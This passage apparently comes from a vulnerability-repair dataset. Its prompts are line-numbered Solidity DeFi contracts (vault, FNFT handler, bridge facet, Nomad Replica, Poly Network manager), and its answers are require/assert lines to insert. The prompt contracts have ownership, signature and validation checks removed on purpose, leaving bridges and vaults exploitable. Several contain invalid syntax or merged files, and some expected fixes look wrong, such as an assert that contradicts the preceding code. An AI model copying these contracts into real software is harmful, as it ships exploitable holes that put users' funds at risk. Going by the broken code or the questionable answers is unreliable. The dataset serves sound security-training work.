shares,\n59         address to,\n60         address payable from\n61     ) external returns (uint256 rewards) {\n62         rewards = visr.balanceOf(address(this)).mul(shares).div(vvisr.totalSupply());\n63         visr.safeTransfer(to, rewards);\n      \n64         vvisr.burn(from, shares);\n65     }\n\n66     function snapshot() external onlyOwner {\n67       vvisr.snapshot();\n68     }\n\n69     function transferOwnership(address newOwner) external onlyOwner {\n70       owner = newOwner;\n71     }\n\n72     function transferTokenOwnership(address newOwner) external onlyOwner {\n73       vvisr.transferOwnership(newOwner); \n74     }\n\n75     function isContract(address _addr) private returns (bool isContract){\n76                                 uint32 size;\n77                                 assembly {\n78                                         size := extcodesize(_addr)\n79                                 }\n80                                 return (size > 0);\n81                 }\n\n82 }",
        "completion": "18+  require(msg.sender == owner, \"only owner\");\n33+  require(visrDeposit > 0, \"deposits must be nonzero\");\n33+  require(to != address(0) && to != address(this), \"to\");\n33+ require(from != address(0) && from != address(this), \"from\");\n44+  require(IVisor(from).owner() == msg.sender); \n45+  assert( IVisor(from) !=  address(this)); \n61+  require(shares > 0, \"shares\");\n61+  require(to != address(0), \"to\");\n61+  require(from != address(0), \"from\");\n63+  require(from == msg.sender || IVisor(from).owner() == msg.sender, \"Sender must own the tokens\");\n"
    },
    {
        "prompt": "1 // SPDX-License-Identifier: GNU-GPL v3.0 or later\n\n2 pragma solidity ^0.8.0;\n\n3 import \"@openzeppelin/contracts/access/AccessControl.sol\";\n4 import \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\n5 import \"@openzeppelin/contracts/token/ERC1155/ERC1155.sol\";\n6 import \"./interfaces/IRevest.sol\";\n7 import \"./interfaces/IAddressRegistry.sol\";\n8 import \"./interfaces/ILockManager.sol\";\n9 import \"./interfaces/ITokenVault.sol\";\n10 import \"./interfaces/IAddressLock.sol\";\n11 import \"./utils/RevestAccessControl.sol\";\n12 import \"./interfaces/IFNFTHandler.sol\";\n13 import \"./interfaces/IMetadataHandler.sol\";\n\n14 contract FNFTHandler is ERC1155, AccessControl, RevestAccessControl, IFNFTHandler {\n\n15     bytes32 public constant PAUSER_ROLE = keccak256(\"PAUSER_ROLE\");\n\n16     mapping(uint => uint) public supply;\n17     uint public fnftsCreated = 0;\n\n18     /**\n19      * @dev Primary constructor to create an instance of NegativeEntropy\n20      * Grants ADMIN and MINTER_ROLE to whoever creates the contract\n21      */\n22     constructor(address provider) ERC1155(\"\") RevestAccessControl(provider) {\n23         _setupRole(DEFAULT_ADMIN_ROLE, _msgSender());\n24         _setupRole(PAUSER_ROLE, _msgSender());\n25     }\n\n26     /**\n27      * @dev See {IERC165-supportsInterface}.\n28      */\n29     function supportsInterface(bytes4 interfaceId) public view virtual override (AccessControl, ERC1155) returns (bool) {\n30         return super.supportsInterface(interfaceId);\n31     }\n\n\n32     function mint(address account, uint id, uint amount, bytes memory data) external override onlyRevestController {    \n33          supply[id] += amount;\n34         _mint(account, id, amount, data);\n35         fnftsCreated += 1;\n36     }\n\n37     function mintBatchRec(address[] calldata recipients, uint[] calldata quantities, uint id, uint newSupply, bytes memory data) external override onlyRevestController {\n38         supply[id] += newSupply;\n39         for(uint i = 0; i < quantities.length; i++) {\n40             _mint(recipients[i], id, quantities[i], data);\n41         }\n42         fnftsCreated += 1;\n43     }\n\n44     function mintBatch(address to, uint[] memory ids, uint[] memory amounts, bytes memory data) external override onlyRevestController {\n45         _mintBatch(to, ids, amounts, data);\n46     }\n\n47     function setURI(string memory newuri) external override onlyRevestController {\n48         _setURI(newuri);\n49     }\n\n50     function burn(address account, uint id, uint amount) external override onlyRevestController {\n51         supply[id] -= amount;\n52         _burn(account, id, amount);\n53     }\n\n54     function burnBatch(address account, uint[] memory ids, uint[] memory amounts) external override onlyRevestController {\n55         _burnBatch(account, ids, amounts);\n56     }\n\n57     function getBalance(address account, uint id) external view override returns (uint) {\n58         return balanceOf(account, id);\n59     }\n\n60     function getSupply(uint fnftId) public view override returns (uint) {\n61         return supply[fnftId];\n62     }\n\n63     function getNextId() public view override returns (uint) {\n64         return fnftsCreated;\n65     }\n\n\n66     // OVERIDDEN ERC-1155 METHODS\n\n67     function _beforeTokenTransfer(\n68         address operator,\n69         address from,\n70         address to,\n71         uint[] memory ids,\n72         uint[] memory amounts,\n73         bytes memory data\n74     ) internal override {\n75         super._beforeTokenTransfer(operator, from, to, ids, amounts, data);\n76         // Loop because all batch transfers must be checked\n77         // Will only execute once on singular transfer\n78         if (from != address(0) && to != address(0)) {\n79             address vault = addressesProvider.getTokenVault();\n80             bool canTransfer = !ITokenVault(vault).getNontransferable(ids[0]);\n81             // Only check if not from minter\n82             // And not being burned\n83             if(ids.length > 1) {\n84                 uint iterator = 0;\n85                 while (canTransfer && iterator < ids.length) {\n86                     canTransfer = !ITokenVault(vault).getNontransferable(ids[iterator]);\n87                     iterator += 1;\n88                 }\n89             }\n90         }\n91     }\n\n92     function uri(uint fnftId) public view override returns (string memory) {\n93         return IMetadataHandler(addressesProvider.getMetadataHandler()).getTokenURI(fnftId);\n94     }\n\n95     function renderTokenURI(\n96         uint tokenId,\n97         address owner\n98     ) public view returns (\n99         string memory baseRenderURI,\n100         string[] memory parameters\n101     ) {\n102         return IMetadataHandler(addressesProvider.getMetadataHandler()).getRenderTokenURI(tokenId, owner);\n103     }\n\n104 }",
        "completion": "32+  require(amount > 0, \"Invalid amount\");\n32+  require(supply[id] == 0, \"Repeated mint for the same FNFT\");\n89+  require(canTransfer, \"E046\");\n"
    },
    {
        "prompt": "1 // SPDX-License-Identifier: MIT\n2 pragma solidity ^0.8.7;\n\n3 import \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\n4 import { LibAsset } from \"../Libraries/LibAsset.sol\";\n5 import { ILiFi } from \"../Interfaces/ILiFi.sol\";\n6 import { LibSwap } from \"../Libraries/LibSwap.sol\";\n7 import { ICBridge } from \"../Interfaces/ICBridge.sol\";\n8 import { LibDiamond } from \"../Libraries/LibDiamond.sol\";\n\n9 /**\n10  * @title CBridge Facet\n11  * @author Li.Finance (https://li.finance)\n12  * @notice Provides functionality for bridging through CBridge\n13  */\n14 contract CBridgeFacet is ILiFi {\n15     /* ========== Storage ========== */\n\n16     bytes32 internal constant NAMESPACE = keccak256(\"com.lifi.facets.cbridge2\");\n17     invokeSwap bool; \n18     struct Storage {\n19         address cBridge;\n20         uint64 cBridgeChainId;\n21     }\n\n22     /* ========== Types ========== */\n\n23     struct CBridgeData {\n24         address receiver;\n25         address token;\n26         uint256 amount;\n27         uint64 dstChainId;\n28         uint64 nonce;\n29         uint32 maxSlippage;\n30     }\n\n31     /* ========== Init ========== */\n\n32     /**\n33      * @notice Initializes local variables for the CBridge facet\n34      * @param _cBridge address of the canonical CBridge router contract\n35      * @param _chainId chainId of this deployed contract\n36      */\n37     function initCbridge(address _cBridge, uint64 _chainId) external {\n38         Storage storage s = getStorage();\n39         LibDiamond.enforceIsContractOwner();\n40         s.cBridge = _cBridge;\n41         s.cBridgeChainId = _chainId;\n42         emit Inited(s.cBridge, s.cBridgeChainId);\n43     }\n\n44     /* ========== Public Bridge Functions ========== */\n\n45     /**\n46      * @notice Bridges tokens via CBridge\n47      * @param _lifiData data used purely for tracking and analytics\n48      * @param _cBridgeData data specific to CBridge\n49      */\n50     function startBridgeTokensViaCBridge(LiFiData memory _lifiData, CBridgeData calldata _cBridgeData) public payable {\n51         if (_cBridgeData.token != address(0)) {\n52             uint256 _fromTokenBalance = LibAsset.getOwnBalance(_cBridgeData.token);\n\n53             LibAsset.transferFromERC20(_cBridgeData.token, msg.sender, address(this), _cBridgeData.amount);\n\n54             require(\n55                 LibAsset.getOwnBalance(_cBridgeData.token) - _fromTokenBalance == _cBridgeData.amount,\n56                 \"ERR_INVALID_AMOUNT\"\n57             );\n58         } else {\n59             _;\n\n60         }\n\n61         _startBridge(_cBridgeData);\n\n62         emit LiFiTransferStarted(\n63             _lifiData.transactionId,\n64             _lifiData.integrator,\n65             _lifiData.referrer,\n66             _lifiData.sendingAssetId,\n67             _lifiData.receivingAssetId,\n68             _lifiData.receiver,\n69             _lifiData.amount,\n70             _lifiData.destinationChainId,\n71             block.timestamp\n72         );\n73     }\n\n74     /**\n75      * @notice Performs a swap before bridging via CBridge\n76      * @param _lifiData data used purely for tracking and analytics\n77      * @param _swapData an array of swap related data for performing swaps before bridging\n78      * @param _cBridgeData data specific to CBridge\n79      */\n80     function swapAndStartBridgeTokensViaCBridge(\n81         LiFiData memory _lifiData,\n82         LibSwap.SwapData[] calldata _swapData,\n83         CBridgeData memory _cBridgeData\n84     ) public payable {\n85         if (_cBridgeData.token != address(0)) {\n86             uint256 _fromTokenBalance = LibAsset.getOwnBalance(_cBridgeData.token);\n\n87             // Swap\n88             for (uint8 i; i < _swapData.length; i++) {\n89                 invokeSwap = true; \n90                 LibSwap.swap(_lifiData.transactionId, _swapData[i], invokeSwap);\n91             }\n\n92             uint256 _postSwapBalance = LibAsset.getOwnBalance(_cBridgeData.token) - _fromTokenBalance;          \n\n93             _cBridgeData.amount = _postSwapBalance;\n94         } else {\n95             uint256 _fromBalance = address(this).balance;\n\n96             // Swap\n97             for (uint8 i; i < _swapData.length; i++) {\n98                 invokeSwap = true; \n99                 LibSwap.swap(_lifiData.transactionId, _swapData[i],  invokeSwap);\n100             }\n\n101             uint256 _postSwapBalance = address(this).balance - _fromBalance;\n\n102             _cBridgeData.amount = _postSwapBalance;\n103         }\n\n104         _startBridge(_cBridgeData);\n\n105         emit LiFiTransferStarted(\n106             _lifiData.transactionId,\n107             _lifiData.integrator,\n108             _lifiData.referrer,\n109             _lifiData.sendingAssetId,\n110             _lifiData.receivingAssetId,\n111             _lifiData.receiver,\n112             _lifiData.amount,\n113             _lifiData.destinationChainId,\n114             block.timestamp\n115         );\n116     }\n\n117     /* ========== Internal Functions ========== */\n\n118     /*\n119      * @dev Conatains the business logic for the bridge via CBridge\n120      * @param _cBridgeData data specific to CBridge\n121      */\n122     function _startBridge(CBridgeData memory _cBridgeData) internal {\n123         Storage storage s = getStorage();\n124         address bridge = _bridge();\n\n125         // Do CBridge stuff      \n126         if (LibAsset.isNativeAsset(_cBridgeData.token)) {\n127             ICBridge(bridge).sendNative(\n128                 _cBridgeData.receiver,\n129                 _cBridgeData.amount,\n130                 _cBridgeData.dstChainId,\n131                 _cBridgeData.nonce,\n132                 _cBridgeData.maxSlippage\n133             );\n134         } else {\n135             // Give CBridge approval to bridge tokens\n136             LibAsset.approveERC20(IERC20(_cBridgeData.token), bridge, _cBridgeData.amount);\n137             // solhint-disable check-send-result\n138             ICBridge(bridge).send(\n139                 _cBridgeData.receiver,\n140                 _cBridgeData.token,\n141                 _cBridgeData.amount,\n142                 _cBridgeData.dstChainId,\n143                 _cBridgeData.nonce,\n144                 _cBridgeData.maxSlippage\n145             );\n146         }\n147     }\n\n148     /*\n149      * @dev Public view function for the CBridge router address\n150      * @returns the router address\n151      */\n152     function _bridge() internal view returns (address) {\n153         Storage storage s = getStorage();\n154         return s.cBridge;\n155     }\n\n156     /**\n157      * @dev fetch local storage\n158      */\n159     function getStorage() internal pure returns (Storage storage s) {\n160         bytes32 namespace = NAMESPACE;\n161         // solhint-disable-next-line no-inline-assembly\n162         assembly {\n163             s.slot := namespace\n164         }\n165     }\n166 }\n167 // SPDX-License-Identifier: MIT\n168 pragma solidity ^0.8.7;\n\n169 import \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\n170 import { LibAsset } from \"./LibAsset.sol\";\n171 import { LibUtil } from \"./LibUtil.sol\";\n\n172 library LibSwap {\n173     uint256 private constant MAX_INT = 2**256 - 1;\n\n174     struct SwapData {\n175         address callTo;\n176         address approveTo;\n177         address sendingAssetId;\n178         address receivingAssetId;\n179         uint256 fromAmount;\n180         bytes callData;\n181     }\n\n182     event AssetSwapped(\n183         bytes32 transactionId,\n184         address dex,\n185         address fromAssetId,\n186         address toAssetId,\n187         uint256 fromAmount,\n188         uint256 toAmount,\n189         uint256 timestamp\n190     );\n\n191     function swap(bytes32 transactionId, SwapData calldata _swapData, bool invokeSwap) internal {       \n192         uint256 fromAmount = _swapData.fromAmount;\n193         uint256 toAmount = LibAsset.getOwnBalance(_swapData.receivingAssetId);\n194         address fromAssetId = _swapData.sendingAssetId;\n195         if (!LibAsset.isNativeAsset(fromAssetId) && LibAsset.getOwnBalance(fromAssetId) < fromAmount) {\n196             LibAsset.transferFromERC20(_swapData.sendingAssetId, msg.sender, address(this), fromAmount);\n197         }\n\n198         if (!LibAsset.isNativeAsset(fromAssetId)) {\n199             LibAsset.approveERC20(IERC20(fromAssetId), _swapData.approveTo, fromAmount);\n200         }\n\n201         // solhint-disable-next-line avoid-low-level-calls\n202         (bool success, bytes memory res) = _swapData.callTo.call{ value: msg.value }(_swapData.callData);\n203         if (!success) {\n204             string memory reason = LibUtil.getRevertMsg(res);\n205             revert(reason);\n206         }\n\n207         toAmount = LibAsset.getOwnBalance(_swapData.receivingAssetId) - toAmount;\n208         emit AssetSwapped(\n209             transactionId,\n210             _swapData.callTo,\n211             _swapData.sendingAssetId,\n212             _swapData.receivingAssetId,\n213             fromAmount,\n214             toAmount,\n215             block.timestamp\n216         );\n217     }\n218 }",
        "completion": "58+ require(msg.value >= _cBridgeData.amount, \"ERR_INVALID_AMOUNT\");\n92+  require(_postSwapBalance > 0, \"ERR_INVALID_AMOUNT\");\n101+ require(_postSwapBalance > 0, \"ERR_INVALID_AMOUNT\");\n125+  require(s.cBridgeChainId != _cBridgeData.dstChainId, \"Cannot bridge to the same network.\");\n191+  assert(!invokeSwap);"
    },
    {
        "prompt": "1 // SPDX-License-Identifier: MIT OR Apache-2.0\n2 pragma solidity >=0.6.11;\n\n3  */\n4 contract Replica {\n \n5     /**\n6      * @notice Emitted when message is processed\n7      * @param messageHash Hash of message that failed to process\n8      * @param success TRUE if the call was executed successfully, FALSE if the call reverted\n9      * @param returnData the return data from the external call\n10      */\n11     event Process(\n12         bytes32 indexed messageHash,\n13         bool indexed success,\n14         bytes indexed returnData\n15     );\n\n   \n\n16     function initialize(\n17         uint32 _remoteDomain,\n18         address _updater,\n19         bytes32 _committedRoot,\n20         uint256 _optimisticSeconds\n21     ) public initializer {\n22         __NomadBase_initialize(_updater);\n23         // set storage variables\n24         entered = 1;\n25         remoteDomain = _remoteDomain;\n26         committedRoot = _committedRoot;     \n27         confirmAt[_committedRoot] = 1;\n28         optimisticSeconds = _optimisticSeconds;\n29         emit SetOptimisticTimeout(_optimisticSeconds);\n30     }\n\n31     // ============ External Functions ============\n\n32     /**\n33      * @notice Called by external agent. Submits the signed update's new root,\n34      * marks root's allowable confirmation time, and emits an `Update` event.\n35      * @dev Reverts if update doesn't build off latest committedRoot\n36      * or if signature is invalid.\n37      * @param _oldRoot Old merkle root\n38      * @param _newRoot New merkle root\n39      * @param _signature Updater's signature on `_oldRoot` and `_newRoot`\n40      */\n41     function update(\n42         bytes32 _oldRoot,\n43         bytes32 _newRoot,\n44         bytes memory _signature\n45     ) external notFailed {\n46         // ensure that update is building off the last submitted root\n47         require(_oldRoot == committedRoot, \"not current update\");\n48         // validate updater signature\n49         require(\n50             _isUpdaterSignature(_oldRoot, _newRoot, _signature),\n51             \"!updater sig\"\n52         );\n53         // Hook for future use\n54         _beforeUpdate();\n55         // set the new root's confirmation timer\n56         confirmAt[_newRoot] = block.timestamp + optimisticSeconds;\n57         // update committedRoot\n58         committedRoot = _newRoot;\n59         emit Update(remoteDomain, _oldRoot, _newRoot, _signature);\n60     }\n\n61     /**\n62      * @notice First attempts to prove the validity of provided formatted\n63      * `message`. If the message is successfully proven, then tries to process\n64      * message.\n65      * @dev Reverts if `prove` call returns false\n66      * @param _message Formatted message (refer to NomadBase.sol Message library)\n67      * @param _proof Merkle proof of inclusion for message's leaf\n68      * @param _index Index of leaf in home's merkle tree\n69      */\n70     function proveAndProcess(\n71         bytes memory _message,\n72         bytes32[32] calldata _proof,\n73         uint256 _index\n74     ) external {\n75         require(prove(keccak256(_message), _proof, _index), \"!prove\");\n76         process(_message);\n77     }\n\n78     /**\n79      * @notice Given formatted message, attempts to dispatch\n80      * message payload to end recipient.\n81      * @dev Recipient must implement a `handle` method (refer to IMessageRecipient.sol)\n82      * Reverts if formatted message's destination domain is not the Replica's domain,\n83      * if message has not been proven,\n84      * or if not enough gas is provided for the dispatch transaction.\n85      * @param _message Formatted message\n86      * @return _success TRUE iff dispatch transaction succeeded\n87      */\n88     function process(bytes memory _message) public returns (bool _success) {\n89         bytes29 _m = _message.ref(0);\n90         // ensure message was meant for this domain\n91         require(_m.destination() == localDomain, \"!destination\");\n92         // ensure message has been proven\n93         bytes32 _messageHash = _m.keccak();\n94         require(messages[_messageHash] == MessageStatus.Proven, \"!proven\");\n95         // check re-entrancy guard\n96         require(entered == 1, \"!reentrant\");\n97         entered = 0;\n98         // update message status as processed\n99         messages[_messageHash] = MessageStatus.Processed;\n100         // A call running out of gas TYPICALLY errors the whole tx. We want to\n101         // a) ensure the call has a sufficient amount of gas to make a\n102         //    meaningful state change.\n103         // b) ensure that if the subcall runs out of gas, that the tx as a whole\n104         //    does not revert (i.e. we still mark the message processed)\n105         // To do this, we require that we have enough gas to process\n106         // and still return. We then delegate only the minimum processing gas.\n107         require(gasleft() >= PROCESS_GAS + RESERVE_GAS, \"!gas\");\n108         // get the message recipient\n109         address _recipient = _m.recipientAddress();\n110         // set up for assembly call\n111         uint256 _toCopy;\n112         uint256 _maxCopy = 256;\n113         uint256 _gas = PROCESS_GAS;\n114         // allocate memory for returndata\n115         bytes memory _returnData = new bytes(_maxCopy);\n116         bytes memory _calldata = abi.encodeWithSignature(\n117             \"handle(uint32,uint32,bytes32,bytes)\",\n118             _m.origin(),\n119             _m.nonce(),\n120             _m.sender(),\n121             _m.body().clone()\n122         );\n123         // dispatch message to recipient\n124         // by assembly calling \"handle\" function\n125         // we call via assembly to avoid memcopying a very large returndata\n126         // returned by a malicious contract\n127         assembly {\n128             _success := call(\n129                 _gas, // gas\n130                 _recipient, // recipient\n131                 0, // ether value\n132                 add(_calldata, 0x20), // inloc\n133                 mload(_calldata), // inlen\n134                 0, // outloc\n135                 0 // outlen\n136             )\n137             // limit our copy to 256 bytes\n138             _toCopy := returndatasize()\n139             if gt(_toCopy, _maxCopy) {\n140                 _toCopy := _maxCopy\n141             }\n142             // Store the length of the copied bytes\n143             mstore(_returnData, _toCopy)\n144             // copy the bytes from returndata[0:_toCopy]\n145             returndatacopy(add(_returnData, 0x20), 0, _toCopy)\n146         }\n147         // emit process results\n148         emit Process(_messageHash, _success, _returnData);\n149         // reset re-entrancy guard\n150         entered = 1;\n151     }\n\n152     // ============ External Owner Functions ============\n\n153     /**\n154      * @notice Set optimistic timeout period for new roots\n155      * @dev Only callable by owner (Governance)\n156      * @param _optimisticSeconds New optimistic timeout period\n157      */\n158     function setOptimisticTimeout(uint256 _optimisticSeconds)\n159         external\n160         onlyOwner\n161     {\n162         optimisticSeconds = _optimisticSeconds;\n163         emit SetOptimisticTimeout(_optimisticSeconds);\n164     }\n\n165     /**\n166      * @notice Set Updater role\n167      * @dev MUST ensure that all roots signed by previous Updater have\n168      * been relayed before calling. Only callable by owner (Governance)\n169      * @param _updater New Updater\n170      */\n171     function setUpdater(address _updater) external onlyOwner {\n172         _setUpdater(_updater);\n173     }\n\n174     /**\n175      * @notice Set confirmAt for a given root\n176      * @dev To be used if in the case that fraud is proven\n177      * and roots need to be deleted / added. Only callable by owner (Governance)\n178      * @param _root The root for which to modify confirm time\n179      * @param _confirmAt The new confirmation time. Set to 0 to \"delete\" a root.\n180      */\n181     function setConfirmation(bytes32 _root, uint256 _confirmAt)\n182         external\n183         onlyOwner\n184     {\n185         uint256 _previousConfirmAt = confirmAt[_root];\n186         confirmAt[_root] = _confirmAt;\n187         emit SetConfirmation(_root, _previousConfirmAt, _confirmAt);\n188     }\n\n189     // ============ Public Functions ============\n\n190     /**\n191      * @notice Check that the root has been submitted\n192      * and that the optimistic timeout period has expired,\n193      * meaning the root can be processed\n194      * @param _root the Merkle root, submitted in an update, to check\n195      * @return TRUE iff root has been submitted & timeout has expired\n196      */\n197     function acceptableRoot(bytes32 _root) public view returns (bool) {\n198         uint256 _time = confirmAt[_root];\n199         if (_time == 0) {\n200             return false;\n201         }\n202         return block.timestamp >= _time;\n203     }\n\n204     /**\n205      * @notice Attempts to prove the validity of message given its leaf, the\n206      * merkle proof of inclusion for the leaf, and the index of the leaf.\n207      * @dev Reverts if message's MessageStatus != None (i.e. if message was\n208      * already proven or processed)\n209      * @dev For convenience, we allow proving against any previous root.\n210      * This means that witnesses never need to be updated for the new root\n211      * @param _leaf Leaf of message to prove\n212      * @param _proof Merkle proof of inclusion for leaf\n213      * @param _index Index of leaf in home's merkle tree\n214      * @return Returns true if proof was valid and `prove` call succeeded\n215      **/\n216     function prove(\n217         bytes32 _leaf,\n218         bytes32[32] calldata _proof,\n219         uint256 _index\n220     ) public returns (bool) {\n221         // ensure that message has not been proven or processed\n222         require(messages[_leaf] == MessageStatus.None, \"!MessageStatus.None\");\n223         // calculate the expected root based on the proof\n224         bytes32 _calculatedRoot = MerkleLib.branchRoot(_leaf, _proof, _index);\n225         // if the root is valid, change status to Proven\n226         if (acceptableRoot(_calculatedRoot)) {\n227             messages[_leaf] = MessageStatus.Proven;\n228             return true;\n229         }\n230         return false;\n231     }\n\n232     /**\n233      * @notice Hash of Home domain concatenated with \"NOMAD\"\n234      */\n235     function homeDomainHash() public view override returns (bytes32) {\n236         return _homeDomainHash(remoteDomain);\n237     }\n\n238     // ============ Internal Functions ============\n\n239     /**\n240      * @notice Moves the contract into failed state\n241      * @dev Called when a Double Update is submitted\n242      */\n243     function _fail() internal override {\n244         _setFailed();\n245     }\n\n246     /// @notice Hook for potential future use\n247     // solhint-disable-next-line no-empty-blocks\n248     function _beforeUpdate() internal {}\n249 }",
        "completion": "26+   assert(_committedRoot != 0); "
    },
    {
        "prompt": "1 pragma solidity ^0.5.0;\n\n2 import \"./../../../libs/math/SafeMath.sol\";\n3 import \"./../../../libs/common/ZeroCopySource.sol\";\n4 import \"./../../../libs/common/ZeroCopySink.sol\";\n5 import \"./../../../libs/utils/Utils.sol\";\n6 import \"./../upgrade/UpgradableECCM.sol\";\n7 import \"./../libs/EthCrossChainUtils.sol\";\n8 import \"./../interface/IEthCrossChainManager.sol\";\n9 import \"./../interface/IEthCrossChainData.sol\";\n10 contract EthCrossChainManager is IEthCrossChainManager, UpgradableECCM {\n11     using SafeMath for uint256;\n\n12     event InitGenesisBlockEvent(uint256 height, bytes rawHeader);\n13     event ChangeBookKeeperEvent(uint256 height, bytes rawHeader);\n14     event CrossChainEvent(address indexed sender, bytes txId, address proxyOrAssetContract, uint64 toChainId, bytes toContract, bytes rawdata);\n15     event VerifyHeaderAndExecuteTxEvent(uint64 fromChainID, bytes toContract, bytes crossChainTxHash, bytes fromChainTxHash);\n16     constructor(address _eccd) UpgradableECCM(_eccd) public {}\n    \n17     /* @notice              sync Poly chain genesis block header to smart contrat\n18     *  @dev                 this function can only be called once, nextbookkeeper of rawHeader can't be empty\n19     *  @param rawHeader     Poly chain genesis block raw header or raw Header including switching consensus peers info\n20     *  @return              true or false\n21     */\n22     function initGenesisBlock(bytes memory rawHeader, bytes memory pubKeyList) whenNotPaused public returns(bool) {\n23         // Load Ethereum cross chain data contract\n24         IEthCrossChainData eccd = IEthCrossChainData(EthCrossChainDataAddress);\n        \n25         // Make sure the contract has not been initialized before\n26         require(eccd.getCurEpochConPubKeyBytes().length == 0, \"EthCrossChainData contract has already been initialized!\");\n        \n27         // Parse header and convit the public keys into nextBookKeeper and compare it with header.nextBookKeeper to verify the validity of signature\n28         ECCUtils.Header memory header = ECCUtils.deserializeHeader(rawHeader);\n29         (bytes20 nextBookKeeper, address[] memory keepers) = ECCUtils.verifyPubkey(pubKeyList);\n        \n30         // Record current epoch start height and public keys (by storing them in address format)\n             \n        \n31         // Fire the event\n32         emit InitGenesisBlockEvent(header.height, rawHeader);\n33         return true;\n34     }\n    \n35     /* @notice              change Poly chain consensus book keeper\n36     *  @param rawHeader     Poly chain change book keeper block raw header\n37     *  @param pubKeyList    Poly chain consensus nodes public key list\n38     *  @param sigList       Poly chain consensus nodes signature list\n39     *  @return              true or false\n40     */\n41     function changeBookKeeper(bytes memory rawHeader, bytes memory pubKeyList, bytes memory sigList) whenNotPaused public returns(bool) {\n42         // Load Ethereum cross chain data contract\n43         ECCUtils.Header memory header = ECCUtils.deserializeHeader(rawHeader);\n44         IEthCrossChainData eccd = IEthCrossChainData(EthCrossChainDataAddress);\n        \n45         // Make sure rawHeader.height is higher than recorded current epoch start height\n46         uint64 curEpochStartHeight = eccd.getCurEpochStartHeight();\n47         require(header.height > curEpochStartHeight, \"The height of header is lower than current epoch start height!\");\n        \n48         // Ensure the rawHeader is the key header including info of switching consensus peers by containing non-empty nextBookKeeper field\n        \n49         // Verify signature of rawHeader comes from pubKeyList\n50         address[] memory polyChainBKs = ECCUtils.deserializeKeepers(eccd.getCurEpochConPubKeyBytes());\n51         uint n = polyChainBKs.length;      \n        \n52         // Convert pubKeyList into ethereum address format and make sure the compound address from the converted ethereum addresses\n53         // equals passed in header.nextBooker\n54         (bytes20 nextBookKeeper, address[] memory keepers) = ECCUtils.verifyPubkey(pubKeyList);       \n        \n55         // update current epoch start height of Poly chain and current epoch consensus peers book keepers addresses\n              \n        \n56         // Fire the change book keeper event\n57         emit ChangeBookKeeperEvent(header.height, rawHeader);\n58         return true;\n59     }\n\n\n60     /* @notice              ERC20 token cross chain to other blockchain.\n61     *                       this function push tx event to blockchain\n62     *  @param toChainId     Target chain id\n63     *  @param toContract    Target smart contract address in target block chain\n64     *  @param txData        Transaction data for target chain, include to_address, amount\n65     *  @return              true or false\n66     */\n67     function crossChain(uint64 toChainId, bytes calldata toContract, bytes calldata method, bytes calldata txData) whenNotPaused external returns (bool) {\n68         // Load Ethereum cross chain data contract\n69         IEthCrossChainData eccd = IEthCrossChainData(EthCrossChainDataAddress);\n        \n70         // To help differentiate two txs, the ethTxHashIndex is increasing automatically\n71         uint256 txHashIndex = eccd.getEthTxHashIndex();\n        \n72         // Convert the uint256 into bytes\n73         bytes memory paramTxHash = Utils.uint256ToBytes(txHashIndex);\n        \n74         // Construct the makeTxParam, and put the hash info storage, to help provide proof of tx existence\n75         bytes memory rawParam = abi.encodePacked(ZeroCopySink.WriteVarBytes(paramTxHash),\n76             ZeroCopySink.WriteVarBytes(abi.encodePacked(sha256(abi.encodePacked(address(this), paramTxHash)))),\n77             ZeroCopySink.WriteVarBytes(Utils.addressToBytes(msg.sender)),\n78             ZeroCopySink.WriteUint64(toChainId),\n79             ZeroCopySink.WriteVarBytes(toContract),\n80             ZeroCopySink.WriteVarBytes(method),\n81             ZeroCopySink.WriteVarBytes(txData)\n82         );\n        \n83         // Must save it in the storage to be included in the proof to be verified.\n               \n84         // Fire the cross chain event denoting there is a cross chain request from Ethereum network to other public chains through Poly chain network\n85         emit CrossChainEvent(tx.origin, paramTxHash, msg.sender, toChainId, toContract, rawParam);\n86         return true;\n87     }\n88     /* @notice              Verify Poly chain header and proof, execute the cross chain tx from Poly chain to Ethereum\n89     *  @param proof         Poly chain tx merkle proof\n90     *  @param rawHeader     The header containing crossStateRoot to verify the above tx merkle proof\n91     *  @param headerProof   The header merkle proof used to verify rawHeader\n92     *  @param curRawHeader  Any header in current epoch consensus of Poly chain\n93     *  @param headerSig     The coverted signature veriable for solidity derived from Poly chain consensus nodes' signature\n94     *                       used to verify the validity of curRawHeader\n95     *  @return              true or false\n96     */\n97     function verifyHeaderAndExecuteTx(bytes memory proof, bytes memory rawHeader, bytes memory headerProof, bytes memory curRawHeader,bytes memory headerSig) whenNotPaused public returns (bool){\n98         ECCUtils.Header memory header = ECCUtils.deserializeHeader(rawHeader);\n99         // Load ehereum cross chain data contract\n100         IEthCrossChainData eccd = IEthCrossChainData(EthCrossChainDataAddress);\n        \n101         // Get stored consensus public key bytes of current poly chain epoch and deserialize Poly chain consensus public key bytes to address[]\n102         address[] memory polyChainBKs = ECCUtils.deserializeKeepers(eccd.getCurEpochConPubKeyBytes());\n\n103         uint256 curEpochStartHeight = eccd.getCurEpochStartHeight();\n\n104         uint n = polyChainBKs.length;\n105         if (header.height >= curEpochStartHeight) {\n106             // It's enough to verify rawHeader signature          \n107         } else {\n108             // We need to verify the signature of curHeader           \n109            _;\n110             // Then use curHeader.StateRoot and headerProof to verify rawHeader.CrossStateRoot\n111             ECCUtils.Header memory curHeader = ECCUtils.deserializeHeader(curRawHeader);\n112             bytes memory proveValue = ECCUtils.merkleProve(headerProof, curHeader.blockRoot);          \n113         }\n        \n114         // Through rawHeader.CrossStatesRoot, the toMerkleValue or cross chain msg can be verified and parsed from proof\n115         bytes memory toMerkleValueBs = ECCUtils.merkleProve(proof, header.crossStatesRoot);\n        \n116         // Parse the toMerkleValue struct and make sure the tx has not been processed, then mark this tx as processed\n117         ECCUtils.ToMerkleValue memory toMerkleValue = ECCUtils.deserializeMerkleValue(toMerkleValueBs);\n        \n118         // Ethereum ChainId is 2, we need to check the transaction is for Ethereum network       \n        \n119         // Obtain the targeting contract, so that Ethereum cross chain manager contract can trigger the executation of cross chain tx on Ethereum side\n120         address toContract = Utils.bytesToAddress(toMerkleValue.makeTxParam.toContract);\n        \n121         //TODO: check this part to make sure we commit the next line when doing local net UT test\n       \n122         // Fire the cross chain event denoting the executation of cross chain tx is successful,\n123         // and this tx is coming from other public chains to current Ethereum network\n124         emit VerifyHeaderAndExecuteTxEvent(toMerkleValue.fromChainID, toMerkleValue.makeTxParam.toContract, toMerkleValue.txHash, toMerkleValue.makeTxParam.txHash);\n\n125         return true;\n126     }\n    \n127     /* @notice                  Dynamically invoke the targeting contract, 